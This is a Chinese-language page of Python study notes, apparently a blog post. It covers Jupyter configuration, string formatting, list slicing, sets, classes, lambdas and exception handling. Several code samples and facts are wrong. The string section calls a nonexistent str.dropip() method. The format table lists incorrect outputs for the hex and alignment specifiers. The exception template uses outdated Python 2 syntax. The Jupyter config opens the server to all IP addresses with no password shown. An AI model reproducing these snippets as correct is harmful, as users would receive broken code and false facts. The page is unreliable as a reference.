<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c.NotebookApp.ip = <span class="string">&#x27;*&#x27;</span>              <span class="comment"># 允许所有ip访问</span></span><br><span class="line">c.NotebookApp.open_browser = <span class="literal">False</span>  <span class="comment"># 不自动打开浏览器</span></span><br><span class="line">c.NotebookApp.port = <span class="number">8888</span>           <span class="comment">#可自行指定一个端口, 访问时使用该端口</span></span><br></pre></td></tr></table></figure>

<h3 id="2-3-设置matplotlib的图像显示大小"><a href="#2-3-设置matplotlib的图像显示大小" class="headerlink" title="2.3. 设置matplotlib的图像显示大小"></a>2.3. 设置matplotlib的图像显示大小</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">plt.rcParams[<span class="string">&quot;figure.figsize&quot;</span>] = (<span class="number">15.0</span>, <span class="number">12.0</span>)</span><br></pre></td></tr></table></figure>

<h2 id="3-pylint-代码风格检查配置"><a href="#3-pylint-代码风格检查配置" class="headerlink" title="3. pylint 代码风格检查配置"></a>3. pylint 代码风格检查配置</h2><h1 id="二、语法相关"><a href="#二、语法相关" class="headerlink" title="二、语法相关"></a>二、语法相关</h1><p>参考文档: <a href="https://www.w3cschool.cn/uqmpir/">W3Cschool</a>、<a href="http://www.runoob.com/python/python-tutorial.html">Runoob</a></p>
<h2 id="1-风格和编码"><a href="#1-风格和编码" class="headerlink" title="1. 风格和编码"></a>1. 风格和编码</h2><h3 id="1-1-指定编码格式"><a href="#1-1-指定编码格式" class="headerlink" title="1.1. 指定编码格式"></a>1.1. 指定编码格式</h3><p>源文件第一行或第二行直接定义</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br></pre></td></tr></table></figure>

<h3 id="1-2-代码风格"><a href="#1-2-代码风格" class="headerlink" title="1.2. 代码风格"></a>1.2. 代码风格</h3><ul>
<li>函数和变量使用下划线命名</li>
<li>全局常量使用大写字母</li>
</ul>
<h2 id="2-变量"><a href="#2-变量" class="headerlink" title="2. 变量"></a>2. 变量</h2><h3 id="2-1-None"><a href="#2-1-None" class="headerlink" title="2.1. None"></a>2.1. None</h3><ul>
<li>None是一个特殊的常量。</li>
<li>None和False不同。</li>
<li>None不是0。</li>
<li>None不是空字符串。</li>
<li>None和任何其他的数据类型比较永远返回False。</li>
<li>None有自己的数据类型NoneType。</li>
<li>你可以将None赋值给任何变量，但是你不能创建其他NoneType对象。</li>
</ul>
<p>python中矩阵索引使用None表示此维度不切片，同样意味着此维度大小未知</p>
<h3 id="2-2-del-删除一个变量释放空间"><a href="#2-2-del-删除一个变量释放空间" class="headerlink" title="2.2. del 删除一个变量释放空间"></a>2.2. del 删除一个变量释放空间</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">del</span> var</span><br></pre></td></tr></table></figure>

<h2 id="3-字符串操作"><a href="#3-字符串操作" class="headerlink" title="3. 字符串操作"></a>3. 字符串操作</h2><h3 id="3-1-替换字符串"><a href="#3-1-替换字符串" class="headerlink" title="3.1. 替换字符串"></a>3.1. 替换字符串</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;abc&#x27;</span></span><br><span class="line"><span class="comment"># 替换字符串，以返回值形式返回，不会在原数据做更改</span></span><br><span class="line"><span class="built_in">str</span> = <span class="built_in">str</span>.replace(<span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="3-2-删除首位空格（包括换行符）"><a href="#3-2-删除首位空格（包括换行符）" class="headerlink" title="3.2. 删除首位空格（包括换行符）"></a>3.2. 删除首位空格（包括换行符）</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="built_in">str</span>.dropip()</span><br></pre></td></tr></table></figure>

<h3 id="3-3-和ASCII码之间的转换"><a href="#3-3-和ASCII码之间的转换" class="headerlink" title="3.3. 和ASCII码之间的转换"></a>3.3. 和ASCII码之间的转换</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 转ASCII码，仅单个字符</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line"><span class="comment"># ASCII码转字符，仅单个ascii码</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="number">97</span>))</span><br></pre></td></tr></table></figure>
<h3 id="3-4-字符串格式化"><a href="#3-4-字符串格式化" class="headerlink" title="3.4. 字符串格式化"></a>3.4. 字符串格式化</h3><p><strong>(1) <code>f&#39;xxx&#39;</code>格式</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="number">1</span></span><br><span class="line">str_test = <span class="string">f&#x27;a = <span class="subst">&#123;a&#125;</span>&#x27;</span></span><br></pre></td></tr></table></figure>

<p><strong>(2) <code>format()</code>格式</strong></p>
<ol>
<li>指定位置</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt;<span class="string">&quot;&#123;&#125; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;world&quot;</span>)    <span class="comment"># 不设置指定位置，按默认顺序</span></span><br><span class="line"><span class="string">&#x27;hello world&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&quot;&#123;0&#125; &#123;1&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;world&quot;</span>)  <span class="comment"># 设置指定位置</span></span><br><span class="line"><span class="string">&#x27;hello world&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&quot;&#123;1&#125; &#123;0&#125; &#123;1&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;world&quot;</span>)  <span class="comment"># 设置指定位置</span></span><br><span class="line"><span class="string">&#x27;world hello world&#x27;</span></span><br></pre></td></tr></table></figure>

<ol start="2">
<li>使用字典</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;网站名：&#123;name&#125;, 地址 &#123;url&#125;&quot;</span>.<span class="built_in">format</span>(name=<span class="string">&quot;菜鸟教程&quot;</span>, url=<span class="string">&quot;www.runoob.com&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过字典设置参数</span></span><br><span class="line">site = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;菜鸟教程&quot;</span>, <span class="string">&quot;url&quot;</span>: <span class="string">&quot;www.runoob.com&quot;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;网站名：&#123;name&#125;, 地址 &#123;url&#125;&quot;</span>.<span class="built_in">format</span>(**site))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过列表索引设置参数</span></span><br><span class="line">my_list = [<span class="string">&#x27;菜鸟教程&#x27;</span>, <span class="string">&#x27;www.runoob.com&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;网站名：&#123;0[0]&#125;, 地址 &#123;0[1]&#125;&quot;</span>.<span class="built_in">format</span>(my_list))  <span class="comment"># &quot;0&quot; 是必须的</span></span><br></pre></td></tr></table></figure>

<ol start="3">
<li>使用格式</li>
</ol>
<table>
<thead>
<tr>
<th>数字</th>
<th>格式</th>
<th>输出</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>11</td>
<td><code>&#39;&#123;:b&#125;&#39;.format(11)</code></td>
<td>1011</td>
<td>二进制</td>
</tr>
<tr>
<td>11</td>
<td><code>&#39;&#123;:d&#125;&#39;.format(11)</code></td>
<td>11</td>
<td>十进制</td>
</tr>
<tr>
<td>11</td>
<td><code>&#39;&#123;:o&#125;&#39;.format(11)</code></td>
<td>13</td>
<td>八进制</td>
</tr>
<tr>
<td>11</td>
<td><code>&#39;&#123;:x&#125;&#39;.format(11)</code></td>
<td>b</td>
<td>小写十六进制</td>
</tr>
<tr>
<td>11</td>
<td><code>&#39;&#123;:X&#125;&#39;.format(11)</code></td>
<td>0xb</td>
<td>大写十六进制</td>
</tr>
<tr>
<td>11</td>
<td><code>&#39;&#123;:#x&#125;&#39;.format(11)</code></td>
<td>0Xb</td>
<td>补 0x 小写十六进制</td>
</tr>
<tr>
<td>11</td>
<td><code>&#39;&#123;:#X&#125;&#39;.format(11)</code></td>
<td>0XB</td>
<td>补 0X 大写写十六进制</td>
</tr>
<tr>
<td>3.1415926</td>
<td><code>&#123;:.2f&#125;</code></td>
<td>3.14</td>
<td>保留小数点后两位</td>
</tr>
<tr>
<td>3.1415926</td>
<td><code>&#123;:+.2f&#125;</code></td>
<td>+3.14</td>
<td>带符号保留小数点后两位</td>
</tr>
<tr>
<td>-1</td>
<td><code>&#123;:+.2f&#125;</code></td>
<td>-1.00</td>
<td>带符号保留小数点后两位</td>
</tr>
<tr>
<td>2.71828</td>
<td><code>&#123;:.0f&#125;</code></td>
<td>3</td>
<td>不带小数</td>
</tr>
<tr>
<td>5</td>
<td><code>&#123;:0&gt;2d&#125;</code></td>
<td>05</td>
<td>数字补零 (填充左边, 宽度为 2)</td>
</tr>
<tr>
<td>5</td>
<td><code>&#123;:x&lt;4d&#125;</code></td>
<td>5xxx</td>
<td>数字补 x (填充右边, 宽度为 4)</td>
</tr>
<tr>
<td>10</td>
<td><code>&#123;:x&lt;4d&#125;</code></td>
<td>10xx</td>
<td>数字补 x (填充右边, 宽度为 4)</td>
</tr>
<tr>
<td>1000000</td>
<td><code>&#123;:,&#125;</code></td>
<td>1,000,000</td>
<td>以逗号分隔的数字格式</td>
</tr>
<tr>
<td>0.25</td>
<td><code>&#123;:.2%&#125;</code></td>
<td>25.00%</td>
<td>百分比格式</td>
</tr>
<tr>
<td>1000000000</td>
<td><code>&#123;:.2e&#125;</code></td>
<td>1.00e+09</td>
<td>指数记法</td>
</tr>
<tr>
<td>13</td>
<td><code>&#123;:&gt;10d&#125;</code></td>
<td><code>--------13</code></td>
<td>右对齐 (默认, 宽度为 10)</td>
</tr>
<tr>
<td>13</td>
<td><code>&#123;:&lt;10d&#125;</code></td>
<td><code>13--------</code></td>
<td>左对齐 (宽度为 10)</td>
</tr>
<tr>
<td>13</td>
<td><code>&#123;:^10d&#125;</code></td>
<td><code>----13----</code></td>
<td>中间对齐 (宽度为 10)</td>
</tr>
</tbody></table>
<h3 id="3-4-二进制和字符串转换"><a href="#3-4-二进制和字符串转换" class="headerlink" title="3.4. 二进制和字符串转换"></a>3.4. 二进制和字符串转换</h3><ul>
<li>使用<code>str.encode()</code>将字符串转成二进制</li>
<li>使用<code>str.decode()</code>将二进制转成字符串</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">str</span> = <span class="string">b&#x27;fW0v6MG1C3\n/UrT6bdQ==\n&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">str</span> = <span class="built_in">str</span>.decode(encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(<span class="built_in">str</span>)</span><br><span class="line">fW0v6MG1C3</span><br><span class="line">/UrT6bdQ==</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">str</span> = <span class="built_in">str</span>.encode(encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(<span class="built_in">str</span>)</span><br><span class="line"><span class="string">b&#x27;fW0v6MG1C3\n/UrT6bdQ==\n&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="3-5-原始字符串"><a href="#3-5-原始字符串" class="headerlink" title="3.5. 原始字符串"></a>3.5. 原始字符串</h3><ul>
<li>三个双引号可以输出原始字符串，换行符空格都会保留</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="string">&quot;&quot;&quot;CREATE TABLE `emm_data` (</span></span><br><span class="line"><span class="string">  `id` int unsigned NOT NULL AUTO_INCREMENT,</span></span><br><span class="line"><span class="string">  `path` varchar(512) COLLATE utf8mb4_bin NOT NULL,</span></span><br><span class="line"><span class="string">  `size` int unsigned NOT NULL,</span></span><br><span class="line"><span class="string">  `modify` date DEFAULT NULL,</span></span><br><span class="line"><span class="string">  PRIMARY KEY (`id`),</span></span><br><span class="line"><span class="string">  UNIQUE KEY `emm_data_path` (`path`)</span></span><br><span class="line"><span class="string">) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_bin&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="4-list操作"><a href="#4-list操作" class="headerlink" title="4. list操作"></a>4. list操作</h2><h3 id="4-1-排序"><a href="#4-1-排序" class="headerlink" title="4.1. 排序"></a>4.1. 排序</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 正向</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>arr = [<span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>arr.sort()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(arr)</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"><span class="comment"># 反向</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>arr.sort(reverse=<span class="literal">True</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(arr)</span><br><span class="line">[<span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 处理dict类型</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>arr = [&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;c&quot;</span>&#125;, &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;b&quot;</span>&#125;, &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;a&quot;</span>&#125;]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>arr.sort(key=<span class="keyword">lambda</span> item: item[<span class="string">&quot;name&quot;</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(arr)</span><br><span class="line">[&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;a&#x27;</span>&#125;, &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;b&#x27;</span>&#125;, &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;c&#x27;</span>&#125;]</span><br></pre></td></tr></table></figure>

<h3 id="4-2-去重"><a href="#4-2-去重" class="headerlink" title="4.2. 去重"></a>4.2. 去重</h3><ul>
<li>使用set的特性去重</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = [<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="built_in">list</span>(<span class="built_in">set</span>(a))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(a)</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br></pre></td></tr></table></figure>

<h3 id="4-3-遍历"><a href="#4-3-遍历" class="headerlink" title="4.3. 遍历"></a>4.3. 遍历</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">listValues = <span class="built_in">list</span>(xxx)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> value <span class="keyword">in</span> listValues:</span><br><span class="line">    <span class="built_in">print</span>(value)</span><br><span class="line">    value = <span class="string">&#x27;a&#x27;</span>     <span class="comment"># list本身不会修改</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(listValues)):</span><br><span class="line">    <span class="built_in">print</span>(listValues[index])</span><br><span class="line">    listValues[index] = <span class="string">&#x27;a&#x27;</span>         <span class="comment"># list本身会修改</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> index, value <span class="keyword">in</span> <span class="built_in">enumerate</span>(listValues):</span><br><span class="line">    <span class="built_in">print</span>(value)</span><br><span class="line">    value = <span class="string">&#x27;a&#x27;</span>                 <span class="comment"># list不会修改</span></span><br><span class="line">    listValues[index] = <span class="string">&#x27;a&#x27;</span>     <span class="comment"># list会修改</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>普通的<code>for value in listValues:</code>无法修改list的值，list值修改只能用index的方式</li>
</ul>
<h3 id="4-4-索引"><a href="#4-4-索引" class="headerlink" title="4.4. 索引"></a>4.4. 索引</h3><ul>
<li>没有冒号就是单纯找下标</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line"><span class="comment"># 正序下标</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a[<span class="number">2</span>]</span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="comment"># 超出范围</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a[<span class="number">12</span>]</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">IndexError: <span class="built_in">list</span> index out of <span class="built_in">range</span></span><br><span class="line"><span class="comment"># 倒序下标</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a[-<span class="number">1</span>]</span><br><span class="line"><span class="number">6</span></span><br></pre></td></tr></table></figure>

<ul>
<li>单冒号输出数组</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line"><span class="comment"># 取1到2，不包含2为下标的数组</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a[<span class="number">1</span>:<span class="number">2</span>]</span><br><span class="line">[<span class="number">2</span>]</span><br><span class="line"><span class="comment"># 右边没有，代表到末尾</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a[-<span class="number">1</span>:]</span><br><span class="line">[<span class="number">6</span>]</span><br><span class="line"><span class="comment"># 左边没有，代表从头开始</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a[:<span class="number">4</span>]</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line"><span class="comment"># 超出边界相当于没写</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a[<span class="number">1</span>:<span class="number">10</span>]</span><br><span class="line">[<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line"><span class="comment"># 相等是空数组</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a[<span class="number">1</span>:<span class="number">1</span>]</span><br><span class="line">[]</span><br><span class="line"><span class="comment"># 倒序返回空</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a[<span class="number">2</span>:<span class="number">1</span>]</span><br><span class="line">[]</span><br><span class="line"><span class="comment"># 倒序返回空</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a[-<span class="number">1</span>:<span class="number">1</span>]</span><br><span class="line">[]</span><br></pre></td></tr></table></figure>

<ul>
<li>双冒号相当于在后面加了一个间隔</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line"><span class="comment"># 反转数组</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a[::-<span class="number">1</span>]</span><br><span class="line">[<span class="number">6</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>]</span><br><span class="line"><span class="comment"># 挑奇数位置</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a[::<span class="number">2</span>]</span><br><span class="line">[<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>]</span><br><span class="line"><span class="comment"># 倒序，下标不倒序为空</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a[<span class="number">0</span>:<span class="number">4</span>:-<span class="number">1</span>]</span><br><span class="line">[]</span><br><span class="line"><span class="comment"># 4开始倒序到0，不包含0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a[<span class="number">4</span>:<span class="number">0</span>:-<span class="number">1</span>]</span><br><span class="line">[<span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>]</span><br></pre></td></tr></table></figure>

<h2 id="4-类"><a href="#4-类" class="headerlink" title="4. 类"></a>4. 类</h2><h3 id="4-1-类的几个特殊函数"><a href="#4-1-类的几个特殊函数" class="headerlink" title="4.1. 类的几个特殊函数"></a>4.1. 类的几个特殊函数</h3><p><strong>1. 构造函数</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, a</span>):</span><br><span class="line">        self.a = a</span><br><span class="line"></span><br><span class="line">tmp = Test(<span class="number">1</span>)</span><br><span class="line">tmp = Test()        <span class="comment"># 报错，需要传入1个参数</span></span><br></pre></td></tr></table></figure>

<p><strong>2. 字符串输出</strong></p>
<ul>
<li>将类作为字符串时，会自动调用此函数输出</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;ccccccc Test xxxxxxx&#x27;</span></span><br><span class="line"></span><br><span class="line">tmp = Test()</span><br><span class="line"><span class="built_in">print</span>(tmp)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(tmp))</span><br></pre></td></tr></table></figure>

<h3 id="4-2-多态"><a href="#4-2-多态" class="headerlink" title="4.2. 多态"></a>4.2. 多态</h3><p><strong>1. 虚函数</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> abc <span class="keyword">import</span> abstractmethod</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Base</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line"><span class="meta">    @abstractmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">test_func</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="5-set-集合"><a href="#5-set-集合" class="headerlink" title="5. set 集合"></a>5. set 集合</h2><h3 id="5-1-基本操作"><a href="#5-1-基本操作" class="headerlink" title="5.1. 基本操作"></a>5.1. 基本操作</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">########## 初始化 ##########</span></span><br><span class="line"><span class="comment"># 通过list初始化</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a_list = [<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a_set = <span class="built_in">set</span>(a_list)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(a_set)</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;</span><br><span class="line"><span class="comment"># 直接初始化</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a_set = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">########## 添加元素 ##########</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a_set = <span class="built_in">set</span>()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a_set.add(<span class="number">4</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a_set.add(<span class="number">4</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a_set.add(<span class="number">3</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a_set.add(<span class="number">2</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a_set.add(<span class="number">3</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(a_set)</span><br><span class="line">&#123;<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;</span><br></pre></td></tr></table></figure>

<h2 id="6-函数"><a href="#6-函数" class="headerlink" title="6. 函数"></a>6. 函数</h2><h3 id="6-1-lambda-匿名函数"><a href="#6-1-lambda-匿名函数" class="headerlink" title="6.1. lambda 匿名函数"></a>6.1. lambda 匿名函数</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">lambda</span> arg1, arg2, ...argN : expression using arguments</span><br></pre></td></tr></table></figure>

<h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><ul>
<li>lambda 函数不能包含命令，包含的表达式不能超过一个。不要试图向 lambda 函数中塞入太多的东西；如果你需要更复杂的东西，应该定义一个普通函数，然后想让它多长就多长。</li>
<li>就lambda而言，它并没有给程序带来性能上的提升，它带来的是代码的简洁。</li>
</ul>
<h3 id="6-2-不定参数"><a href="#6-2-不定参数" class="headerlink" title="6.2. 不定参数"></a>6.2. 不定参数</h3><h2 id="7-try-异常处理"><a href="#7-try-异常处理" class="headerlink" title="7. try 异常处理"></a>7. try 异常处理</h2><h3 id="try-except-else"><a href="#try-except-else" class="headerlink" title="try-except-else"></a>try-except-else</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    &lt;语句&gt;        <span class="comment">#可能出错的代码</span></span><br><span class="line"><span class="keyword">except</span> &lt;名字&gt;：</span><br><span class="line">    &lt;语句&gt;        <span class="comment">#如果在try部份引发了&#x27;name&#x27;异常</span></span><br><span class="line"><span class="keyword">except</span> &lt;名字&gt;，&lt;数据&gt;:</span><br><span class="line">    &lt;语句&gt;        <span class="comment">#如果引发了&#x27;name&#x27;异常，获得附加的数据</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    &lt;语句&gt;        <span class="comment">#如果没有异常发生</span></span><br></pre></td></tr></table></figure>

<h3 id="try-finally"><a href="#try-finally" class="headerlink" title="try-finally"></a>try-finally</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    &lt;语句&gt;</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    &lt;语句&gt;    <span class="comment">#退出try时总会执行</span></span><br></pre></td></tr></table></figure>

<h3 id="raise触发异常"><a href="#raise触发异常" class="headerlink" title="raise触发异常"></a>raise触发异常</h3><h4 id="形式"><a href="#形式" class="headerlink" title="形式"></a>形式</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">raise</span> [Exception [, args [, traceback]]]</span><br></pre></td></tr></table></figure>

<h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mye</span>(<span class="params">level</span>):</span><br><span class="line">    <span class="keyword">if</span> level &lt; <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&quot;Invalid level!&quot;</span>)</span><br><span class="line">        <span class="comment"># 触发异常后，后面的代码就不会再执行</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    mye(<span class="number">0</span>)            <span class="comment"># 触发异常</span></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> err:</span><br><span class="line">    <span class="built_in">print</span>(<span class="number">1</span>, err)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>

<p>输出</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1 Invalid level!</span><br></pre></td></tr></table></figure>

<h4 id="用户自定义异常"><a href="#用户自定义异常" class="headerlink" title="用户自定义异常"></a>用户自定义异常</h4><p>通过创建一个新的异常类，程序可以命名它们自己的异常。异常应该是典型的继承自Exception类，通过直接或间接的方式。</p>
